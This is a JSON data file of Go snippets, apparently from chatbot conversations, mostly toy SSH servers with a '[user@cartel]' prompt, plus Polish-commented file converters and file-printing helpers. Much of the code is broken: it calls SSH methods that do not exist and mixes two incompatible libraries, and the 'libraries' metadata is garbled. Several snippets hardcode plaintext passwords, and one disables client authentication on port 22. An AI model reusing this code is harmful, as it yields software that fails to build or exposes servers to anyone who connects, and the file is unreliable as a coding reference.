    "filename": "261c6c20abdfc4e1b275aa9777469f7c_0.go"
  },
  {
    "conversation_hash": "261c6c20abdfc4e1b275aa9777469f7c",
    "code_index": 1,
    "language": "Go",
    "libraries": [
      "a"
    ],
    "code": "func main() {\n\t// Load the users from a JSON file\n\tusers, err := loadUsers(\"users.json\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Start the SSH server\n\terr = ssh.ListenAndServe(\":2222\", nil, ssh.PasswordAuth(func(ctx ssh.Context, pass string) bool {\n\t\t// Check if the provided username and password matches a user in the list\n\t\tfor _, user := range users {\n\t\t\tif ctx.User() == user.Username && pass == user.Password {\n\t\t\t\treturn true\n\t\t\t}\n\t\t}\n\t\treturn false\n\t}), ssh.KeyboardInteractive(func(ctx ssh.Context, challenger ssh.KeyboardInteractiveChallenge) bool {\n\t\tlog.Print(\"keyboard interactive not supported\")\n\t\treturn false\n\t}), ssh.PublicKeyAuth(func(ctx ssh.Context, key ssh.PublicKey) bool {\n\t\tlog.Print(\"public key authentication not supported\")\n\t\treturn false\n\t}), ssh.Terminal(func(ctx ssh.Context, term *ssh.Terminal) bool {\n\t\tterm.Write([]byte(\"Welcome to the Basic SSH App!\\n\"))\n\t\tterm.Prompt = fmt.Sprintf(\"[%s@cartel]~$ \", ctx.User())\n\t\treturn true\n\t}), ssh.Subsystem(func(ctx ssh.Context, subsystem string) bool {\n\t\tlog.Print(\"subsystem not supported\")\n\t\treturn false\n\t}), ssh.Command(func(ctx ssh.Context, command string) ([]byte, error) {\n\t\tswitch command {\n\t\tcase \"help\":\n\t\t\treturn []byte(\"Commands:\\nhelp - shows all commands including this one with descriptions\\nwhoami - displays your username\\nclear - clears screen and displays welcome message\\n\"), nil\n\t\tcase \"whoami\":\n\t\t\treturn []byte(fmt.Sprintf(\"Username: %s\\n\", ctx.User())), nil\n\t\tcase \"clear\":\n\t\t\tlog.Print(\"clearing screen\")\n\t\t\tterm := ctx.Value(ssh.TerminalContextKey).(*ssh.Terminal)\n\t\t\tterm.Write([]byte(\"\\033[H\\033[2J\"))\n\t\t\tterm.Write([]byte(\"Welcome to the Basic SSH App!\\n\"))\n\t\t\tterm.Prompt = fmt.Sprintf(\"[%s@cartel]~$ \", ctx.User())\n\t\t\treturn nil, nil\n\t\tdefault:\n\t\t\treturn []byte(\"Invalid command. Type 'help' to see the available commands.\\n\"), nil\n\t\t}\n\t}))\n\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}",
    "filename": "261c6c20abdfc4e1b275aa9777469f7c_1.go"
  },
  {
    "conversation_hash": "a78df093c667bc31c9e2edf6f402ca94",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strings\"\n\n\t\"github.com/gliderlabs/ssh\"\n)\n\nvar users = map[string]string{\n\t\"user1\": \"password1\",\n\t\"user2\": \"password2\",\n\t\"user3\": \"password3\",\n}\n\nfunc main() {\n\tssh.Handle(func(s ssh.Session) {\n\t\tusername, password, ok := s.User(), s.User(), false\n\t\ts.Write([]byte(\"Login: \"))\n\t\ts.ReadPassword()\n\t\tif p, ok := users[username]; ok && p == password {\n\t\t\tok = true\n\t\t\ts.Write([]byte(fmt.Sprintf(\"Welcome %s!\\n\", username)))\n\t\t} else {\n\t\t\ts.Write([]byte(\"Access denied.\\n\"))\n\t\t}\n\n\t\tif !ok {\n\t\t\treturn\n\t\t}\n\n\t\tprompt := fmt.Sprintf(\"[%s@cartel]~$ \", username)\n\n\t\tfor {\n\t\t\ts.Write([]byte(prompt))\n\t\t\tline, _ := s.ReadLine()\n\t\t\targs := strings.Split(line, \" \")\n\n\t\t\tswitch args[0] {\n\t\t\tcase \"help\":\n\t\t\t\ts.Write([]byte(\"Available commands:\\n\"))\n\t\t\t\ts.Write([]byte(\"help - shows all commands including this one with descriptions\\n\"))\n\t\t\t\ts.Write([]byte(\"whoami - displays your username\\n\"))\n\t\t\t\ts.Write([]byte(\"clear - clears screen and displays welcome message\\n\"))\n\t\t\tcase \"whoami\":\n\t\t\t\ts.Write([]byte(fmt.Sprintf(\"%s\\n\", username)))\n\t\t\tcase \"clear\":\n\t\t\t\ts.Write([]byte(\"\\033[H\\033[2J\")) // ANSI escape sequence to clear the terminal\n\t\t\t\ts.Write([]byte(fmt.Sprintf(\"Welcome %s!\\n\", username)))\n\t\t\tdefault:\n\t\t\t\ts.Write([]byte(\"Command not found. Type 'help' to see available commands.\\n\"))\n\t\t\t}\n\t\t}\n\t})\n\n\terr := ssh.ListenAndServe(\":2222\", nil)\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n}",
    "filename": "a78df093c667bc31c9e2edf6f402ca94_0.go"
  },
  {
    "conversation_hash": "a78df093c667bc31c9e2edf6f402ca94",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strings\"\n\n\t\"golang.org/x/crypto/ssh\"\n)\n\nvar users = map[string]string{\n\t\"user1\": \"password1\",\n\t\"user2\": \"password2\",\n\t\"user3\": \"password3\",\n}\n\nfunc main() {\n\tconfig := &ssh.ServerConfig{\n\t\tPasswordCallback: func(conn ssh.ConnMetadata, password []byte) (*ssh.Permissions, error) {\n\t\t\tusername := conn.User()\n\n\t\t\tif p, ok := users[username]; ok && string(password) == p {\n\t\t\t\treturn nil, nil\n\t\t\t}\n\t\t\treturn nil, fmt.Errorf(\"password rejected for %q\", username)\n\t\t},\n\t}\n\n\tprivateBytes := []byte(\"YOUR PRIVATE KEY\")\n\tprivateKey, _ := ssh.ParsePrivateKey(privateBytes)\n\tconfig.AddHostKey(privateKey)\n\n\tssh.Handle(func(s ssh.Session) {\n\t\tusername := s.User()\n\t\ts.Write([]byte(fmt.Sprintf(\"Welcome %s!\\n\\n\", username)))\n\n\t\tprompt := fmt.Sprintf(\"[%s@cartel]~$ \", username)\n\n\t\tfor {\n\t\t\ts.Write([]byte(prompt))\n\t\t\tlineBytes, _ := s.ReadBytes('\\n')\n\t\t\tline := string(lineBytes[:len(lineBytes)-1])\n\t\t\targs := strings.Split(line, \" \")\n\n\t\t\tswitch args[0] {\n\t\t\tcase \"help\":\n\t\t\t\ts.Write([]byte(\"Available commands:\\n\"))\n\t\t\t\ts.Write([]byte(\"help - shows all commands including this one with descriptions\\n\"))\n\t\t\t\ts.Write([]byte(\"whoami - displays your username\\n\"))\n\t\t\t\ts.Write([]byte(\"clear - clears screen and displays welcome message\\n\"))\n\t\t\tcase \"whoami\":\n\t\t\t\ts.Write([]byte(fmt.Sprintf(\"%s\\n\", username)))\n\t\t\tcase \"clear\":\n\t\t\t\ts.Write([]byte(\"\\033[H\\033[2J\")) // ANSI escape sequence to clear the terminal\n\t\t\t\ts.Write([]byte(fmt.Sprintf(\"Welcome %s!\\n\\n\", username)))\n\t\t\tdefault:\n\t\t\t\ts.Write([]byte(\"Command not found. Type 'help' to see available commands.\\n\"))\n\t\t\t}\n\t\t}\n\t})\n\n\terr := ssh.ListenAndServe(\":2222\", nil, config)\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n}",
    "filename": "a78df093c667bc31c9e2edf6f402ca94_3.go"
  },
  {
    "conversation_hash": "a78df093c667bc31c9e2edf6f402ca94",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strings\"\n\n\t\"golang.org/x/crypto/ssh\"\n)\n\nvar users = map[string]string{\n\t\"user1\": \"password1\",\n\t\"user2\": \"password2\",\n\t\"user3\": \"password3\",\n}\n\nconst customBanner = `\n**************************************\n*                                    *\n*      Welcome to My SSH Server      *\n*                                    *\n**************************************\n`\n\nfunc main() {\n\tconfig := &ssh.ServerConfig{\n\t\tPasswordCallback: func(conn ssh.ConnMetadata, password []byte) (*ssh.Permissions, error) {\n\t\t\tusername := conn.User()\n\n\t\t\tif p, ok := users[username]; ok && string(password) == p {\n\t\t\t\treturn nil, nil\n\t\t\t}\n\t\t\treturn nil, fmt.Errorf(\"password rejected for %q\", username)\n\t\t},\n\t}\n\n\tprivateBytes := []byte(\"YOUR PRIVATE KEY\")\n\tprivateKey, _ := ssh.ParsePrivateKey(privateBytes)\n\tconfig.AddHostKey(privateKey)\n\n\tssh.Handle(func(s ssh.Session) {\n\t\tusername := s.User()\n\t\ts.Write([]byte(customBanner))\n\t\ts.Write([]byte(fmt.Sprintf(\"Welcome, %s!\\n\\n\", username)))\n\n\t\tprompt := fmt.Sprintf(\"[%s@cartel]~$ \", username)\n\n\t\tfor {\n\t\t\ts.Write([]byte(prompt))\n\t\t\tlineBytes, _ := s.ReadBytes('\\n')\n\t\t\tline := string(lineBytes[:len(lineBytes)-1])\n\t\t\targs := strings.Split(line, \" \")\n\n\t\t\tswitch args[0] {\n\t\t\tcase \"help\":\n\t\t\t\ts.Write([]byte(\"Available commands:\\n\"))\n\t\t\t\ts.Write([]byte(\"help - shows all commands including this one with descriptions\\n\"))\n\t\t\t\ts.Write([]byte(\"whoami - displays your username\\n\"))\n\t\t\t\ts.Write([]byte(\"clear - clears screen and displays welcome message\\n\"))\n\t\t\tcase \"whoami\":\n\t\t\t\ts.Write([]byte(fmt.Sprintf(\"%s\\n\", username)))\n\t\t\tcase \"clear\":\n\t\t\t\ts.Write([]byte(\"\\033[H\\033[2J\")) // ANSI escape sequence to clear the terminal\n\t\t\t\ts.Write([]byte(fmt.Sprintf(\"%s\\n\\n\", customBanner)))\n\t\t\t\ts.Write([]byte(fmt.Sprintf(\"Welcome, %s!\\n\\n\", username)))\n\t\t\tdefault:\n\t\t\t\ts.Write([]byte(\"Command not found. Type 'help' to see available commands.\\n\"))\n\t\t\t}\n\t\t}\n\t})\n\n\terr := ssh.ListenAndServe(\":2222\", nil, config)\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n}",
    "filename": "a78df093c667bc31c9e2edf6f402ca94_5.go"
  },
  {
    "conversation_hash": "2ff02903881e9474a0cde6fb99f6d85f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"golang.org/x/crypto/ssh\"\n\t\"io\"\n\t\"strings\"\n)\n\nvar users = map[string]string{\n\t\"alice\": \"12345\",\n\t\"bob\":   \"password\",\n}\n\nfunc main() {\n\tconfig := &ssh.ServerConfig{\n\t\tPasswordCallback: func(conn ssh.ConnMetadata, password []byte) (*ssh.Permissions, error) {\n\t\t\tuser := conn.User()\n\t\t\tif users[user] == string(password) {\n\t\t\t\treturn nil, nil\n\t\t\t}\n\t\t\treturn nil, fmt.Errorf(\"password rejected for %q\", user)\n\t\t},\n\t}\n\n\tprivateBytes := []byte(`your private key`) // TODO: Add your private key here\n\t_, err := config.SetRSAPrivateKey(privateBytes)\n\tif err != nil {\n\t\tfmt.Println(\"Failed to parse private key:\", err)\n\t\treturn\n\t}\n\n\t// Start SSH server\n\tfmt.Println(\"Starting SSH server on port 2222...\")\n\terr = ssh.ListenAndServe(\":2222\", nil, config)\n\tif err != nil {\n\t\tfmt.Println(\"Failed to start SSH server:\", err)\n\t\treturn\n\t}\n}\n\ntype session struct {\n\tusername string\n}\n\nfunc (s *session) handleChannels(channels <-chan ssh.NewChannel) {\n\tfor newChannel := range channels {\n\t\tgo s.handleChannel(newChannel)\n\t}\n}\n\nfunc (s *session) handleChannel(newChannel ssh.NewChannel) {\n\tchannel, _, err := newChannel.Accept()\n\tif err != nil {\n\t\tfmt.Println(\"Failed to accept channel:\", err)\n\t\treturn\n\t}\n\n\tio.WriteString(channel, fmt.Sprintf(\"Welcome, %s, to \\\"cartel\\\"!\\n\", s.username))\n\tio.WriteString(channel, fmt.Sprintf(\"[%s@cartel]~$ \", s.username))\n\n\tgo io.Copy(channel, channel) // Forward input/output\n\n\t// Handle SSH requests\n\tvar buff [256]byte\n\tfor {\n\t\tn, err := channel.Read(buff[:])\n\t\tif err != nil {\n\t\t\tbreak\n\t\t}\n\n\t\tgo s.handleRequest(string(buff[:n]), channel)\n\t}\n}\n\nfunc (s *session) handleRequest(req string, channel ssh.Channel) {\n\treq = strings.TrimSpace(req)\n\targs := strings.Split(req, \" \")\n\n\tswitch args[0] {\n\tcase \"help\":\n\t\thelp := \"help - displays all commands with a description, including this one\\n\" +\n\t\t\t\"whoami - displays username\\n\" +\n\t\t\t\"clear - clears the screen entirely\\n\"\n\n\t\tio.WriteString(channel, help)\n\n\tcase \"whoami\":\n\t\tio.WriteString(channel, fmt.Sprintf(\"%s\\n\", s.username))\n\n\tcase \"clear\":\n\t\tio.WriteString(channel, \"\\033[H\\033[2J\")\n\t\tio.WriteString(channel, fmt.Sprintf(\"[%s@cartel]~$ \", s.username))\n\n\tdefault:\n\t\tio.WriteString(channel, fmt.Sprintf(\"Unknown command: %s\\n\", args[0]))\n\t\tio.WriteString(channel, fmt.Sprintf(\"[%s@cartel]~$ \", s.username))\n\t}\n}",
    "filename": "2ff02903881e9474a0cde6fb99f6d85f_0.go"
  },
  {
    "conversation_hash": "12c006e616576686a853f2b44e5140d6",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io\"\n\t\"strings\"\n\n\t\"github.com/gliderlabs/ssh\"\n)\n\nvar users = map[string]string{\n\t\"alice\": \"password1\",\n\t\"bob\":   \"password2\",\n\t\"charlie\": \"password3\",\n}\n\nfunc main() {\n\tssh.Handle(handleSSH)\n\terr := ssh.ListenAndServe(\":2222\", nil)\n\tif err != nil {\n\t\tfmt.Println(\"Error starting SSH server:\", err)\n\t}\n}\n\nfunc handleSSH(s ssh.Session) {\n\tio.WriteString(s, \"Welcome to cartel!\\n\\n\")\n\tif !login(s) {\n\t\tio.WriteString(s, \"Login failed. Goodbye!\\n\")\n\t\treturn\n\t}\n\tusername := s.User()\n\tio.WriteString(s, fmt.Sprintf(\"Welcome, %s!\\n\\n\", username))\n\n\tfor {\n\t\tio.WriteString(s, fmt.Sprintf(\"[%s@cartel]~$ \", username))\n\t\tcmd, err := s.ReadLine()\n\t\tif err != nil {\n\t\t\treturn\n\t\t}\n\t\tcmd = strings.TrimSpace(cmd)\n\n\t\tswitch cmd {\n\t\tcase \"help\":\n\t\t\tshowHelp(s)\n\t\tcase \"whoami\":\n\t\t\tshowUsername(s, username)\n\t\tcase \"clear\":\n\t\t\tclearScreen(s)\n\t\tcase \"exit\":\n\t\t\treturn\n\t\tdefault:\n\t\t\tio.WriteString(s, \"Command not found. Type 'help' for available commands.\\n\")\n\t\t}\n\t}\n}\n\nfunc login(s ssh.Session) bool {\n\tio.WriteString(s, \"Please enter your username and password to login.\\n\")\n\n\tusername, password, ok := s.UserAuth()\n\tif !ok {\n\t\treturn false\n\t}\n\n\tif storedPassword, found := users[username]; found && storedPassword == password {\n\t\treturn true\n\t}\n\n\treturn false\n}\n\nfunc showHelp(s ssh.Session) {\n\thelpText := `\nAvailable commands:\n- help: display all commands with a description, including this one\n- whoami: display your username\n- clear: clear the screen entirely\n- exit: logout and exit\n`\n\tio.WriteString(s, helpText)\n}\n\nfunc showUsername(s ssh.Session, username string) {\n\tio.WriteString(s, fmt.Sprintf(\"You are logged in as: %s\\n\", username))\n}\n\nfunc clearScreen(s ssh.Session) {\n\tio.WriteString(s, \"\\033[H\\033[2J\")\n}",
    "filename": "12c006e616576686a853f2b44e5140d6_0.go"
  },
  {
    "conversation_hash": "12c006e616576686a853f2b44e5140d6",
    "code_index": 1,
    "language": "Go",
    "libraries": [
      "and"
    ],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strings\"\n\n\t\"github.com/gliderlabs/ssh\"\n\t\"golang.org/x/crypto/ssh/terminal\"\n)\n\nvar users = map[string]string{\n\t\"alice\":   \"password1\",\n\t\"bob\":     \"password2\",\n\t\"charlie\": \"password3\",\n}\n\nfunc main() {\n\tssh.Handle(handleSSH)\n\terr := ssh.ListenAndServe(\":2222\", nil)\n\tif err != nil {\n\t\tfmt.Println(\"Error starting SSH server:\", err)\n\t}\n}\n\nfunc handleSSH(s ssh.Session) {\n\tfmt.Fprintf(s, \"Welcome to cartel!\\n\\n\")\n\tif !login(s) {\n\t\tfmt.Fprintf(s, \"Login failed. Goodbye!\\n\")\n\t\treturn\n\t}\n\tusername := s.User()\n\tfmt.Fprintf(s, \"Welcome, %s!\\n\\n\", username)\n\n\tfor {\n\t\tfmt.Fprintf(s, \"[%s@cartel]~$ \", username)\n\t\tcmd, err := readCommand(s)\n\t\tif err != nil {\n\t\t\treturn\n\t\t}\n\t\tcmd = strings.TrimSpace(cmd)\n\n\t\tswitch cmd {\n\t\tcase \"help\":\n\t\t\tshowHelp(s)\n\t\tcase \"whoami\":\n\t\t\tshowUsername(s, username)\n\t\tcase \"clear\":\n\t\t\tclearScreen(s)\n\t\tcase \"exit\":\n\t\t\treturn\n\t\tdefault:\n\t\t\tfmt.Fprintf(s, \"Command not found. Type 'help' for available commands.\\n\")\n\t\t}\n\t}\n}\n\nfunc login(s ssh.Session) bool {\n\tfmt.Fprintf(s, \"Please enter your username: \")\n\tusername, err := readCommand(s)\n\tif err != nil {\n\t\treturn false\n\t}\n\n\tfmt.Fprintf(s, \"Please enter your password: \")\n\tpassword, err := readPassword(s)\n\tif err != nil {\n\t\treturn false\n\t}\n\n\tstoredPassword, found := users[username]\n\tif found && storedPassword == password {\n\t\treturn true\n\t}\n\n\treturn false\n}\n\nfunc readCommand(s ssh.Session) (string, error) {\n\tcmd, err := s.Read(envStdin{}.File, envStdoutErr{}.File)\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\treturn string(cmd), nil\n}\n\nfunc readPassword(s ssh.Session) (string, error) {\n\tpassword, err := terminal.ReadPassword(int(envStdin{}.Fd()))\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\tfmt.Fprintln(envStdoutErr{}.File)\n\treturn string(password), nil\n}\n\nfunc showHelp(s ssh.Session) {\n\thelpText := `\nAvailable commands:\n- help: display all commands with a description, including this one\n- whoami: display your username\n- clear: clear the screen entirely\n- exit: logout and exit\n`\n\tfmt.Fprintf(s, helpText)\n}\n\nfunc showUsername(s ssh.Session, username string) {\n\tfmt.Fprintf(s, \"You are logged in as: %s\\n\", username)\n}\n\nfunc clearScreen(s ssh.Session) {\n\tfmt.Fprintf(s, \"\\033[H\\033[2J\")\n}\n\n// envStdin and envStdoutErr are helper structs to implement the ssh.File interface\n// that allows reading from and writing to the SSH session\ntype envStdin struct{}\n\nfunc (envStdin) Read(data []byte) (int, error) {\n\treturn envStdin{}.File.Read(data)\n}\n\nfunc (envStdin) Fd() uintptr {\n\treturn 0 // Stdin file descriptor\n}\n\nfunc (envStdin) Close() error {\n\treturn nil\n}\n\nfunc (envStdin) Write(data []byte) (int, error) {\n\treturn 0, fmt.Errorf(\"not supported\")\n}\n\nfunc (envStdoutErr) Write(data []byte) (int, error) {\n\treturn envStdoutErr{}.File.Write(data)\n}\n\ntype envStdoutErr struct{}\n\nfunc (envStdoutErr) Read(data []byte) (int, error) {\n\treturn 0, fmt.Errorf(\"not supported\")\n}\n\nfunc (envStdoutErr) Fd() uintptr {\n\treturn 1 // Stdout file descriptor\n}\n\nfunc (envStdoutErr) Close() error {\n\treturn nil\n}",
    "filename": "12c006e616576686a853f2b44e5140d6_1.go"
  },
  {
    "conversation_hash": "e506665c649c96588e4004554b106bff",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\n   import (\n   \t\"fmt\"\n   \t\"io\"\n   \t\"io/ioutil\"\n\n   \t\"github.com/gliderlabs/ssh\"\n   \t\"golang.org/x/crypto/ssh/terminal\"\n   )",
    "filename": "e506665c649c96588e4004554b106bff_1.go"
  },
  {
    "conversation_hash": "e506665c649c96588e4004554b106bff",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "func isValidCredentials(username, password string) bool {\n   \t// Define valid username-password combinations\n   \tvalidCredentials := []UserCredentials{\n   \t\t{\"user1\", \"pass1\"},\n   \t\t{\"user2\", \"pass2\"},\n   \t}\n\n   \t// Check if the provided credentials match\n   \tfor _, credentials := range validCredentials {\n   \t\tif credentials.Username == username && credentials.Password == password {\n   \t\t\treturn true\n   \t\t}\n   \t}\n\n   \treturn false\n   }",
    "filename": "e506665c649c96588e4004554b106bff_3.go"
  },
  {
    "conversation_hash": "e506665c649c96588e4004554b106bff",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n   \t// Configure SSH server\n   \tssh.Handle(func(s ssh.Session) {\n   \t\thandleSession(s)\n   \t})\n\n   \t// Read private key\n   \tprivateBytes, _ := ioutil.ReadFile(\"path_to_private_key\")\n   \tprivate, _ := ssh.ParsePrivateKey(privateBytes)\n\n   \t// Configure SSH server options\n   \tsshConfig := &ssh.ServerConfig{\n   \t\tNoClientAuth: true,\n   \t}\n   \tsshConfig.AddHostKey(private)\n\n   \t// Start the SSH server\n   \tfmt.Println(\"Starting SSH server on port 22...\")\n   \terr := ssh.ListenAndServe(\":22\", nil, sshConfig)\n   \tif err != nil {\n   \t\tfmt.Println(\"Failed to start SSH server:\", err)\n   \t}\n   }",
    "filename": "e506665c649c96588e4004554b106bff_5.go"
  },
  {
    "conversation_hash": "044d3511435ee1ede527846a0d544e92",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/binary\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"os\"\n)\n\nfunc main() {\n\t// Pobranie nazwy pliku jako argumenta uruchomienia programu\n\tif len(os.Args) != 2 {\n\t\tlog.Fatal(\"Podaj nazwę pliku jako argument uruchomienia programu\")\n\t}\n\n\t// Pobranie danych z pliku\n\tdata, err := ioutil.ReadFile(os.Args[1])\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Otwarcie/utworzenie pliku dla zapisu\n\toutputFile, err := os.Create(os.Args[1] + \".bin\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer outputFile.Close()\n\n\t// Konwersja danych na system dwójkowy i zapis do pliku\n\terr = binary.Write(outputFile, binary.LittleEndian, data)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tlog.Println(\"Konwersja zakończona!\")\n}",
    "filename": "044d3511435ee1ede527846a0d544e92_0.go"
  },
  {
    "conversation_hash": "044d3511435ee1ede527846a0d544e92",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/binary\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"os\"\n)\n\nfunc main() {\n\t// Pobranie nazw plików jako argumentów uruchomienia programu\n\tif len(os.Args) != 3 {\n\t\tlog.Fatal(\"Podaj nazwę pliku do konwersji i plik wynikowy jako argumenty uruchomienia programu\")\n\t}\n\n\t// Pobranie danych z pliku do konwersji\n\tdata, err := ioutil.ReadFile(os.Args[1])\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Konwersja danych na system dwójkowy\n\tbinaryData := make([]byte, len(data))\n\tfor i, b := range data {\n\t\tbinaryData[i] = byte(b % 2)\n\t}\n\n\t// Zapis przekonwertowanych danych do pliku wynikowego\n\toutputFile, err := os.Create(os.Args[2])\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer outputFile.Close()\n\n\t_, err = outputFile.Write(binaryData)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tfmt.Println(\"Konwersja zakończona!\")\n}",
    "filename": "044d3511435ee1ede527846a0d544e92_2.go"
  },
  {
    "conversation_hash": "044d3511435ee1ede527846a0d544e92",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io\"\n\t\"log\"\n\t\"os\"\n)\n\nfunc main() {\n\t// Pobranie nazw plików jako argumentów uruchomienia programu\n\tif len(os.Args) != 3 {\n\t\tlog.Fatal(\"Podaj nazwę pliku do konwersji i plik wynikowy jako argumenty uruchomienia programu\")\n\t}\n\n\t// Otwarcie pliku do konwersji\n\tinputFile, err := os.Open(os.Args[1])\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer inputFile.Close()\n\n\t// Otwarcie pliku wynikowego\n\toutputFile, err := os.Create(os.Args[2])\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer outputFile.Close()\n\n\t// Konwersja danych na system dwójkowy i zapis do pliku\n\t_, err = io.Copy(outputFile, newBinaryReader(inputFile))\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tfmt.Println(\"Konwersja zakończona!\")\n}\n\ntype binaryReader struct {\n\tr   io.Reader\n\tbuf []byte\n}\n\nfunc newBinaryReader(r io.Reader) *binaryReader {\n\treturn &binaryReader{r: r, buf: make([]byte, 8192)}\n}\n\nfunc (br *binaryReader) Read(p []byte) (int, error) {\n\tn, err := br.r.Read(br.buf)\n\tif err != nil && err != io.EOF {\n\t\treturn 0, err\n\t}\n\tfor i := 0; i < n; i++ {\n\t\tp[i] = br.buf[i] % 2\n\t}\n\treturn n, err\n}",
    "filename": "044d3511435ee1ede527846a0d544e92_4.go"
  },
  {
    "conversation_hash": "25a3e83c1a480a52a0c87d620d7175cb",
    "code_index": 1,
    "language": "Go",
    "libraries": [
      "statements"
    ],
    "code": "import (\n    // Other import statements\n    \"log\"\n    \"os\"\n)\n\nfunc main() {\n    // Create a new logger\n    logger := log.New(os.Stdout, \"[SSHApp] \", log.Ldate|log.Ltime)\n\n    // ...\n\n    // Handle SSH sessions\n    ssh.Handle(func(s ssh.Session) {\n        logger.Printf(\"New SSH session from %s\\n\", s.RemoteAddr().String())\n        handleSession(s)\n    })\n\n    // ...\n\n    // Start SSH server\n    logger.Println(\"Starting SSH server on port 22…\")\n    err := ssh.ListenAndServe(\":22\", nil)\n    if err != nil {\n        logger.Printf(\"Failed to start SSH server: %s\\n\", err)\n    }\n}",
    "filename": "25a3e83c1a480a52a0c87d620d7175cb_1.go"
  },
  {
    "conversation_hash": "3e5f0f0ec458fe43278e10b9870141ac",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func outputFile(term *terminal.Terminal, filePath string) {\n    data, err := ioutil.ReadFile(filePath)\n    if err != nil {\n        term.Write([]byte(fmt.Sprintf(\"Failed to read file: %s\\n\", err)))\n    } else {\n        term.Write([]byte(data))\n    }\n}",
    "filename": "3e5f0f0ec458fe43278e10b9870141ac_1.go"
  },
  {
    "conversation_hash": "3e5f0f0ec458fe43278e10b9870141ac",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "func outputFile(term *terminal.Terminal, filePath string) {\n    data, err := ioutil.ReadFile(filePath)\n    if err != nil {\n        term.Write([]byte(fmt.Sprintf(\"Failed to read file: %s\\n\", err)))\n    } else {\n        var byteData []byte\n        for _, char := range data {\n            byteData = append(byteData, byte(char))\n        }\n        term.Write(byteData)\n    }\n}",
    "filename": "3e5f0f0ec458fe43278e10b9870141ac_4.go"
  },
  {
    "conversation_hash": "3e5f0f0ec458fe43278e10b9870141ac",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "func outputFile(term *terminal.Terminal, filePath string) {\n    data, err := ioutil.ReadFile(filePath)\n    if err != nil {\n        term.Write([]byte(fmt.Sprintf(\"Failed to read file: %s\\n\", err)))\n    } else {\n        term.Write(data)\n    }\n}",
    "filename": "3e5f0f0ec458fe43278e10b9870141ac_5.go"
  },
  {
    "conversation_hash": "3e5f0f0ec458fe43278e10b9870141ac",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "func outputFile(term *terminal.Terminal, filePath string) {\n    data, err := ioutil.ReadFile(filePath)\n    if err != nil {\n        term.Write([]byte(fmt.Sprintf(\"Failed to read file: %s\\n\", err)))\n    } else {\n        lines := strings.Split(string(data), \"\\n\")\n        for _, line := range lines {\n            term.Write([]byte(line + \"\\n\"))\n        }\n    }\n}",
    "filename": "3e5f0f0ec458fe43278e10b9870141ac_6.go"
  },
  {
    "conversation_hash": "3e5f0f0ec458fe43278e10b9870141ac",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"io/ioutil\"\n    \"strings\"\n\n    \"github.com/gliderlabs/ssh\"\n    \"golang.org/x/crypto/ssh/terminal\"\n)\n\n// ... Rest of the code ...\n\nfunc outputFile(term *terminal.Terminal, filePath string) {\n    data, err := ioutil.ReadFile(filePath)\n    if err != nil {\n        term.Write([]byte(fmt.Sprintf(\"Failed to read file: %s\\n\", err)))\n    } else {\n        lines := strings.Split(string(data), \"\\n\")\n        for _, line := range lines {\n            term.Write([]byte(line + \"\\n\"))\n        }\n    }\n}\n\n// ... Rest of the code ...",
    "filename": "3e5f0f0ec458fe43278e10b9870141ac_8.go"
  },
  {
    "conversation_hash": "3e5f0f0ec458fe43278e10b9870141ac",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "func outputFile(term *terminal.Terminal, filePath string) {\n    data, err := ioutil.ReadFile(filePath)\n    if err != nil {\n        term.Write([]byte(fmt.Sprintf(\"Failed to read file: %s\\n\", err)))\n    } else {\n        term.WriteRaw(data)\n    }\n}",
    "filename": "3e5f0f0ec458fe43278e10b9870141ac_9.go"
  },
  {
    "conversation_hash": "3e5f0f0ec458fe43278e10b9870141ac",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
